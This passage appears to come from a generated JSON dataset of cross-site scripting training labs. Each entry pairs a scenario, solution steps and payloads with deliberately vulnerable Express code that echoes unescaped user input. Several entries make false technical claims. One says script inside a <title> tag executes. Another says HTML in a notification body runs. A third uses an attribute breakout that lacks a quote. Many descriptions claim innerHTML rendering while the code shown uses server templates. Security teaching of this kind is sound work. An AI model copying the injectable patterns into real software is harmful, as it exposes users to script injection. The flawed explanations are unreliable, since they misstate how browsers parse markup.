    ],
    "payloads": [
      "<div draggable='true' ondragstart=alert('dragXSS')>Drag</div>",
      "<img draggable='true' src=x onerror=alert('drag')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet items = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-item', (req, res) => {\n  items.push(req.body.label);\n  res.redirect('/drag');\n});\n\napp.get('/drag', (req, res) => {\n  const html = items.map(i => `<div draggable='true'>${i}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic favicon generator",
    "Lab Description": "The application lets users generate custom favicon previews from submitted SVG code. The SVG is directly rendered as a favicon and also previewed in a full-size viewer using innerHTML, making it vulnerable to script injection via SVG tags.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit an SVG containing <script> or onload attributes",
      "App renders the SVG in preview area using innerHTML",
      "Script executes when the page loads or favicon preview is clicked"
    ],
    "payloads": [
      "<svg xmlns='http://www.w3.org/2000/svg'><script>alert('faviconXSS')</script></svg>",
      "<svg><image href='x' onerror='alert(1)'></svg>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet svg = '';\n\napp.use(express.text());\n\napp.post('/favicon', (req, res) => {\n  svg = req.body;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><div>${svg}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via 3D model annotation tooltips",
    "Lab Description": "The 3D viewer app allows users to add annotations to models. These annotations are shown as tooltips rendered using innerHTML. Malicious input leads to XSS when hovering over annotation points.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add an annotation with payload like <img src=x onerror=alert(1)>",
      "Open the 3D model with annotations",
      "Hover over the tooltip to trigger the script"
    ],
    "payloads": [
      "<img src=x onerror=alert('3D-XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet annotations = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/annotate', (req, res) => {\n  annotations.push(req.body.note);\n  res.redirect('/model');\n});\n\napp.get('/model', (req, res) => {\n  const html = annotations.map(a => `<div class='tooltip'>${a}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via music playlist name rendering",
    "Lab Description": "The music app allows users to create custom playlist names. These names are rendered in the DOM using innerHTML when displaying playlists. A malicious name results in script execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create a playlist with a name like <script>alert(1)</script>",
      "Navigate to the playlist dashboard",
      "Script executes when the name is rendered"
    ],
    "payloads": [
      "<script>alert('playlistXSS')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet playlists = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/create-playlist', (req, res) => {\n  playlists.push(req.body.name);\n  res.redirect('/playlists');\n});\n\napp.get('/playlists', (req, res) => {\n  const html = playlists.map(p => `<div>${p}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via real-time poll voting labels",
    "Lab Description": "The poll app displays live results and includes user-submitted vote labels. These are rendered using innerHTML, and malicious labels can trigger XSS when displayed in the poll chart.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a vote with a label like <img src=x onerror=alert(1)>",
      "Wait for the result to render",
      "Observe script execution in chart or result box"
    ],
    "payloads": [
      "<img src=x onerror=alert('pollXSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet votes = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/vote', (req, res) => {\n  votes.push(req.body.label);\n  res.redirect('/results');\n});\n\napp.get('/results', (req, res) => {\n  const html = votes.map(v => `<li>${v}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via language switcher label reflection",
    "Lab Description": "The app allows switching between multiple languages. If a language label is attacker-controlled and reflected directly in a dropdown using innerHTML, it leads to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject a language name like <img src=x onerror=alert(1)>",
      "Load the language switcher component",
      "Payload executes inside dropdown on load"
    ],
    "payloads": [
      "<img src=x onerror=alert('langXSS')>",
      "<script>alert('lang')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet languages = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-lang', (req, res) => {\n  languages.push(req.body.lang);\n  res.redirect('/lang-switch');\n});\n\napp.get('/lang-switch', (req, res) => {\n  const html = languages.map(l => `<option>${l}</option>`).join('');\n  res.send(`<html><body><select>${html}</select></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via user-generated page title injection",
    "Lab Description": "The app allows users to set custom titles for pages they create. These titles are inserted into the `<title>` tag of the HTML document without sanitization, enabling XSS through script injection in the title context.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a page with title <script>alert('titleXSS')</script>",
      "Navigate to the page",
      "Browser parses and executes script inside <title> tag"
    ],
    "payloads": [
      "<script>alert('titleXSS')</script>",
      "\"></title><script>alert('breakout')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet pageTitle = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-title', (req, res) => {\n  pageTitle = req.body.title;\n  res.redirect('/page');\n});\n\napp.get('/page', (req, res) => {\n  res.send(`\n    <html>\n      <head><title>${pageTitle}</title></head>\n      <body><h1>Welcome</h1></body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via user-submitted avatar preview filename",
    "Lab Description": "Users can upload avatar images and preview them. The preview includes the uploaded file name as a caption. If the file name contains script, and is rendered without escaping, it triggers XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Upload an image with a filename like <img src=x onerror=alert(1)>",
      "Visit the preview page",
      "Payload executes as part of the caption"
    ],
    "payloads": [
      "<img src=x onerror=alert('avatar')>",
      "<svg/onload=alert('avatarXSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet filename = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-avatar', (req, res) => {\n  filename = req.body.name;\n  res.redirect('/preview-avatar');\n});\n\napp.get('/preview-avatar', (req, res) => {\n  res.send(`<html><body><img src='avatar.png'><p>${filename}</p></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via iframe sandbox escape with malformed srcdoc",
    "Lab Description": "The app loads user input into an iframe using the `srcdoc` attribute. When the input contains malformed tags or escaping characters, browsers may incorrectly parse and execute embedded scripts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a payload using srcdoc with broken closing quotes",
      "Script escapes into the DOM",
      "Observe alert from unescaped context"
    ],
    "payloads": [
      "\"><script>alert('sandboxEscape')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet content = '';\n\napp.use(express.text());\n\napp.post('/srcdoc', (req, res) => {\n  content = req.body;\n  res.redirect('/frame');\n});\n\napp.get('/frame', (req, res) => {\n  res.send(`<html><body><iframe srcdoc=\"${content}\"></iframe></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via search autocomplete history rendering",
    "Lab Description": "The app stores user search terms and displays them as autocomplete suggestions in a dropdown. If search history includes injected HTML, it is rendered via innerHTML in the suggestion box.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Search for a term like <img src=x onerror=alert(1)>",
      "Autocomplete feature shows suggestion",
      "Script executes on display"
    ],
    "payloads": [
      "<img src=x onerror=alert('autoXSS')>",
      "<svg/onload=alert('autocomplete')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet searches = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/search', (req, res) => {\n  searches.push(req.body.term);\n  res.redirect('/suggestions');\n});\n\napp.get('/suggestions', (req, res) => {\n  const html = searches.map(s => `<li>${s}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via embedded comment in HTML rendering",
    "Lab Description": "The app displays article comments and allows HTML-like formatting. It uses innerHTML to render comments. An attacker can inject malformed comments with script inside a fake HTML comment, which may be parsed and executed in certain browsers or contexts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit comment like <!--><script>alert(1)</script>",
      "App renders it with innerHTML",
      "Browser fails to recognize comment boundary and runs script"
    ],
    "payloads": [
      "<!--><script>alert('commentXSS')</script>",
      "<!--\"--><img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet comments = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/view-comments');\n});\n\napp.get('/view-comments', (req, res) => {\n  const html = comments.map(c => `<div>${c}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic meta tag content injection",
    "Lab Description": "The application sets meta tags dynamically based on user input, such as `<meta name='description'>`. The content attribute is directly populated from unescaped input, which allows for injection inside the HTML head.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a payload like \"><script>alert(1)</script>",
      "App inserts it into the meta tag’s content",
      "Browser executes script injected through broken attribute"
    ],
    "payloads": [
      "\"><script>alert('metaXSS')</script>",
      "'><img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-meta', (req, res) => {\n  desc = req.body.desc;\n  res.redirect('/meta-preview');\n});\n\napp.get('/meta-preview', (req, res) => {\n  res.send(`<html><head><meta name='description' content='${desc}'></head><body>Meta Set</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via file preview in filename-based viewer",
    "Lab Description": "The app previews file names in a table using innerHTML. Maliciously crafted filenames with script or malformed tags get executed when previewed.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Upload or simulate a file with a name like <script>alert(1)</script>",
      "Visit the preview page",
      "Script executes inside filename list"
    ],
    "payloads": [
      "<script>alert('filenameXSS')</script>",
      "<img src=x onerror=alert('file')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet files = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  files.push(req.body.filename);\n  res.redirect('/files');\n});\n\napp.get('/files', (req, res) => {\n  const html = files.map(f => `<li>${f}</li>`).join('');\n  res.send(`<html><body><ul>${html}</ul></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via browser notification content injection",
    "Lab Description": "The app generates browser notifications based on user actions. Notification body content is passed via user input and used directly without sanitization, enabling payload injection that can trigger via the Notification API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit payload like <img src=x onerror=alert(1)>",
      "Notification script inserts it as body",
      "Payload executes when notification triggers"
    ],
    "payloads": [
      "<img src=x onerror=alert('notifyXSS')>",
      "<svg/onload=alert('noti')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet msg = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-message', (req, res) => {\n  msg = req.body.msg;\n  res.redirect('/notify');\n});\n\napp.get('/notify', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          if (Notification.permission === 'granted') {\n            new Notification('Message', { body: '${msg}' });\n          } else {\n            Notification.requestPermission().then(p => {\n              if (p === 'granted') new Notification('Message', { body: '${msg}' });\n            });\n          }\n        </script>\n      </body>\n    </html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via modal dialog dynamic content",
    "Lab Description": "The application opens modal dialogs with content fetched from user-controlled sources. This content is injected into the modal body using innerHTML, allowing for script execution if malicious HTML is provided.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit content with <script>alert(1)</script>",
      "Open a modal where that content is loaded",
      "Script executes inside modal container"
    ],
    "payloads": [
      "<script>alert('modalXSS')</script>",
      "<img src=x onerror=alert('modal')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet modalContent = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-modal', (req, res) => {\n  modalContent = req.body.content;\n  res.redirect('/modal');\n});\n\napp.get('/modal', (req, res) => {\n  res.send(`<html><body>\n    <button onclick=\"document.getElementById('modal').style.display='block'\">Open</button>\n    <div id='modal' style='display:none'>${modalContent}</div>\n  </body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via print preview injection in report builder",
    "Lab Description": "The app provides printable reports and allows users to insert text blocks. These are rendered in a print preview window using innerHTML. Injected HTML leads to XSS on load or print.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Insert text block with <script>alert(1)</script>",
      "Open the print preview feature",
      "Script executes before print or during preview render"
    ],
    "payloads": [
      "<script>alert('printXSS')</script>",
      "<img src=x onerror=alert('print')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet blocks = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-block', (req, res) => {\n  blocks.push(req.body.block);\n  res.redirect('/print');\n});\n\napp.get('/print', (req, res) => {\n  const html = blocks.map(b => `<div>${b}</div>`).join('');\n  res.send(`<html><body>${html}<script>window.print()</script></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic breadcrumb trail rendering",
    "Lab Description": "The application constructs breadcrumb navigation based on the current path or user input. The labels are rendered using innerHTML without proper sanitization, allowing script injection through crafted breadcrumb segments.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Manipulate URL to include breadcrumb segment like <img src=x onerror=alert(1)>",
      "Breadcrumb renderer parses the segment and injects into DOM",
      "Script executes inside breadcrumb container"
    ],
    "payloads": [
      "<img src=x onerror=alert('crumbXSS')>",
      "<svg/onload=alert('breadcrumb')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/breadcrumb', (req, res) => {\n  const label = req.query.label || 'Home';\n  res.send(`<html><body><nav>${label} / Dashboard</nav></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via survey builder preview text",
    "Lab Description": "The app allows users to build surveys with custom questions and preview them. The question text is rendered using innerHTML, allowing an attacker to inject script in a question label.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Add a question with text like <script>alert(1)</script>",
      "Go to the survey preview page",
      "Observe script execution when question is rendered"
    ],
    "payloads": [
      "<script>alert('surveyXSS')</script>",
      "<img src=x onerror=alert('survey')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet questions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-question', (req, res) => {\n  questions.push(req.body.q);\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  const html = questions.map(q => `<div>${q}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via system log viewer with user input reflection",
    "Lab Description": "The log viewer displays server logs that include some user input (e.g., usernames, actions). If the log output is rendered using innerHTML without sanitization, attackers can inject malicious HTML into logs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger an action that logs your name as <script>alert(1)</script>",
      "Access the admin log viewer",
      "Payload executes when the log entry is rendered"
    ],
    "payloads": [
      "<script>alert('logXSS')</script>",
      "<img src=x onerror=alert('log')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet logs = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/action', (req, res) => {\n  logs.push(`User ${req.body.user} performed an action.`);\n  res.redirect('/logs');\n});\n\napp.get('/logs', (req, res) => {\n  const html = logs.map(l => `<div>${l}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via photo album tag cloud rendering",
    "Lab Description": "The app generates a tag cloud based on user-defined tags for images. The tags are inserted directly into the DOM using innerHTML, leading to XSS when a tag contains executable HTML.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Create a tag like <img src=x onerror=alert(1)>",
      "Visit the photo album page",
      "Observe execution when the tag is displayed in the cloud"
    ],
    "payloads": [
      "<img src=x onerror=alert('tagCloudXSS')>",
      "<svg/onload=alert('tag')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  tags.push(req.body.tag);\n  res.redirect('/cloud');\n});\n\napp.get('/cloud', (req, res) => {\n  const html = tags.map(t => `<span>${t}</span>`).join(' ');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via dynamic status badge on profile",
    "Lab Description": "Users can set a custom status on their profile. This value is displayed as a badge using innerHTML. If the input is not sanitized, it enables arbitrary HTML injection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set your status to <script>alert(1)</script>",
      "Visit your own or someone else's view of your profile",
      "Script executes as the badge is rendered"
    ],
    "payloads": [
      "<script>alert('statusXSS')</script>",
      "<img src=x onerror=alert('status')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet status = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-status', (req, res) => {\n  status = req.body.status;\n  res.redirect('/profile');\n});\n\napp.get('/profile', (req, res) => {\n  res.send(`<html><body><div class='badge'>${status}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via live preview of social media post",
    "Lab Description": "The app allows users to draft social media posts and preview them before publishing. The preview panel renders the post using innerHTML. If the input contains HTML or scripts, it executes in the preview pane.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Draft a post with content: <img src=x onerror=alert(1)>",
      "Click 'Preview Post'",
      "Observe payload executing in the live preview"
    ],
    "payloads": [
      "<script>alert('previewXSS')</script>",
      "<img src=x onerror=alert('livePreview')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet post = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/draft', (req, res) => {\n  post = req.body.content;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><div id='preview'>${post}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via status message in real-time activity feed",
    "Lab Description": "User status updates are broadcast to a real-time feed using WebSocket. Messages are injected into the feed container via innerHTML. A crafted message can include HTML that executes instantly.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a WebSocket message containing <script>alert(1)</script>",
      "Message is injected into other users’ feeds",
      "Observe payload execution across clients"
    ],
    "payloads": [
      "<script>alert('feedXSS')</script>",
      "<img src=x onerror=alert('activity')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', socket => {\n  socket.on('message', msg => {\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(msg);\n      }\n    });\n  });\n});\n\napp.get('/feed', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <ul id='feed'></ul>\n        <script>\n          const ws = new WebSocket('ws://' + location.host);\n          ws.onmessage = e => {\n            document.getElementById('feed').innerHTML += '<li>' + e.data + '</li>';\n          };\n        </script>\n      </body>\n    </html>`);\n});\n\nserver.listen(3000);"
  },
  {
    "Lab scenario": "XSS via theme color name in CSS injection",
    "Lab Description": "Users can define theme settings including color names. These names are injected into a `<style>` tag for live theming. Malicious names can break out of CSS and inject HTML or JS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set theme color name to: red;}<script>alert(1)</script>{",
      "App injects value into CSS rules inside `<style>` tag",
      "Script is parsed and executed"
    ],
    "payloads": [
      "red;}<script>alert('themeXSS')</script>{",
      "blue;}<img src=x onerror=alert('theme')>{"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet themeColor = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-theme', (req, res) => {\n  themeColor = req.body.color;\n  res.redirect('/themed');\n});\n\napp.get('/themed', (req, res) => {\n  res.send(`\n    <html>\n      <head><style>.btn { background: ${themeColor}; }</style></head>\n      <body><button class='btn'>Click</button></body>\n    </html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via forum quote reply injection",
    "Lab Description": "In the forum, replying to a post quotes the original message. The quote content is copied and rendered with innerHTML. If the original contains a payload, the reply will include executable code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a forum post with <script>alert(1)</script>",
      "Click 'Reply with Quote'",
      "Observe payload execution in reply editor or preview"
    ],
    "payloads": [
      "<script>alert('quoteXSS')</script>",
      "<img src=x onerror=alert('quote')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet messages = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/post', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/forum');\n});\n\napp.get('/forum', (req, res) => {\n  const html = messages.map(m => `<div>${m}</div><button onclick=\"document.getElementById('reply').innerHTML='${m}'\">Reply with Quote</button>`).join('<hr>');\n  res.send(`<html><body>${html}<div id='reply'></div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via embedded widget parameter injection",
    "Lab Description": "The platform supports embedding widgets via iframe or script snippet. The widget accepts parameters via query string. If these values are reflected in the widget HTML, XSS can occur.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Construct iframe src with query: ?label=<script>alert(1)</script>",
      "Embed widget on external page",
      "Observe payload executing inside embedded context"
    ],
    "payloads": [
      "<script>alert('widgetXSS')</script>",
      "<img src=x onerror=alert('widget')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/widget', (req, res) => {\n  const label = req.query.label || 'Default';\n  res.send(`<html><body><div>${label}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via notification sound name in audio tag",
    "Lab Description": "The app allows users to customize their notification sound by selecting a named sound file. The selected name is inserted into an `<audio>` tag’s `src` attribute using innerHTML. A malicious name can break out of the attribute and inject script.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a sound name like x onerror=alert(1)//",
      "App renders: <audio src='x onerror=alert(1)//'>",
      "Script executes when audio tag is parsed"
    ],
    "payloads": [
      "x onerror=alert('audioXSS')//",
      "'><script>alert('sound')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet sound = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-sound', (req, res) => {\n  sound = req.body.name;\n  res.redirect('/notification');\n});\n\napp.get('/notification', (req, res) => {\n  res.send(`<html><body><audio src='${sound}' autoplay></audio></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via tooltip for user reaction emoji",
    "Lab Description": "The app shows emoji reactions with user tooltips. When hovering over a reaction, a tooltip displays the user’s name. If names are rendered using innerHTML, XSS can be triggered via a malicious username.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set username to <img src=x onerror=alert(1)>",
      "React to a post",
      "Hover over your emoji and observe payload in tooltip"
    ],
    "payloads": [
      "<img src=x onerror=alert('emojiTooltip')>",
      "<svg/onload=alert('emoji')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet reactions = [];\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/react', (req, res) => {\n  reactions.push(req.body.username);\n  res.redirect('/post');\n});\n\napp.get('/post', (req, res) => {\n  const html = reactions.map(u => `<span title='${u}'>👍</span>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via email signature HTML rendering",
    "Lab Description": "The app allows users to set a custom email signature. The signature is rendered as-is in the compose window using innerHTML. A malicious payload in the signature leads to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set your signature to <script>alert(1)</script>",
      "Open the email compose window",
      "Script executes when signature loads"
    ],
    "payloads": [
      "<script>alert('signatureXSS')</script>",
      "<img src=x onerror=alert('sig')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet signature = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-signature', (req, res) => {\n  signature = req.body.sig;\n  res.redirect('/compose');\n});\n\napp.get('/compose', (req, res) => {\n  res.send(`<html><body><div id='editor'>${signature}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via rich text editor auto-save preview",
    "Lab Description": "The app auto-saves drafts from a rich text editor and previews the last saved content using innerHTML. If an attacker injects a payload, it executes when the preview is shown.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Type <img src=x onerror=alert(1)> in editor",
      "Trigger auto-save",
      "Visit draft preview page to see execution"
    ],
    "payloads": [
      "<img src=x onerror=alert('autosaveXSS')>",
      "<script>alert('draft')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet draft = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/autosave', (req, res) => {\n  draft = req.body.content;\n  res.send('Saved');\n});\n\napp.get('/preview-draft', (req, res) => {\n  res.send(`<html><body><div>${draft}</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via failed login error message",
    "Lab Description": "The login page displays an error message when authentication fails. If the username is reflected in the error using innerHTML, an attacker can inject a payload to be executed after failed login.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit login with username <script>alert(1)</script>",
      "Password can be anything",
      "Error message reflects the username and triggers XSS"
    ],
    "payloads": [
      "<script>alert('loginXSS')</script>",
      "<img src=x onerror=alert('login')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const name = req.body.username;\n  res.send(`<html><body><p>Login failed for user: ${name}</p></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via feedback form confirmation message",
    "Lab Description": "The feedback form displays a confirmation message after submission that includes the user’s name. The name is rendered using innerHTML without sanitization, allowing XSS via crafted input.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit feedback with name: <img src=x onerror=alert(1)>",
      "Wait for confirmation message",
      "Payload executes in the success dialog"
    ],
    "payloads": [
      "<script>alert('feedbackXSS')</script>",
      "<img src=x onerror=alert('confirm')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  const name = req.body.name;\n  res.send(`<html><body><p>Thanks for your feedback, ${name}!</p></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via custom label in dynamic progress bar",
    "Lab Description": "The application renders progress bars with custom labels provided by users. These labels are injected into innerHTML of progress components. A malicious label leads to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a label like <script>alert(1)</script>",
      "View the progress bar in dashboard",
      "Payload executes inside the bar"
    ],
    "payloads": [
      "<script>alert('progressXSS')</script>",
      "<img src=x onerror=alert('progress')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-progress', (req, res) => {\n  label = req.body.label;\n  res.redirect('/progress');\n});\n\napp.get('/progress', (req, res) => {\n  res.send(`<html><body><div class='bar'>${label}: 70%</div></body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via image alt-text in gallery lightbox viewer",
    "Lab Description": "The image gallery shows the `alt` text of images in a lightbox preview. If the `alt` attribute is set by the user and rendered using innerHTML, it enables XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload an image with alt=<img src=x onerror=alert(1)>",
